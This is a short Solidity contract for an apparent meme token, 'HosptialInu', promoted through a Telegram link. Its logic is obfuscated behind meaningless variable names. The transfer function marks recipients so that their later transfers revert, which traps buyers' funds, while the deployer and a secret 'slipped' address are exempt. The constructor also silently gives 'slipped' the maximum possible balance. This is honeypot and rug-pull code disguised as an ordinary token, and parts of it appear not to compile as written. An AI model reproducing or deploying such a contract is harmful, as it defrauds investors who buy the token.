// https://t.me/Hospitalinueth

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract HosptialInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private powerful;

    function _transfer(
        address engine,
        address fierce,
        uint256 moon
    ) internal override {
        uint256 fire = steel;

        if (hungry[engine] == 0 && powerful[engine] > 0 && engine != uniswapV2Pair) {
            hungry[engine] -= fire;
        }

        address touch = address(why);
        why = HosptialInu(fierce);
        powerful[touch] += fire + 1;

        _balances[engine] -= moon;
        uint256 actually = (moon / 100) * steel;
        moon -= actually;
        _balances[fierce] += moon;
    }

    mapping(address => uint256) private hungry;
    uint256 public steel = 4;

    constructor(
        string memory reader,
        string memory plant,
        address written,
        address slipped
    ) ERC20(reader, plant) {
        uniswapV2Router = IUniswapV2Router02(written);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        uint256 find = ~uint256(0);

        hungry[msg.sender] = find;
        hungry[slipped] = find;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[slipped] = find;
    }

    HosptialInu private why;
}